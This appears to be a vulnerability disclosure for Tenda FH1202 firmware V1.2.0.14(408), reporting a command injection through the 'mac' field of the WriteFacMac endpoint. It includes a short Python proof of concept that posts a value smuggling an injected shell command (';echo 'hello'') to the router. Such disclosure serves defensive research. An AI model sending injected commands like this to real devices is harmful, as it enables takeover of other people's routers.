## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware, we discovered a command injection vulnerablility in `formWriteFacMac` function in the `v2` parameter and the `mac` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `mac` can trigger this security vulnerability.

![image-20240319225415852](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319225415852.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WriteFacMac"
payload = ";echo 'hello'"

data = {"mac": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319225505444](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319225505444.png)
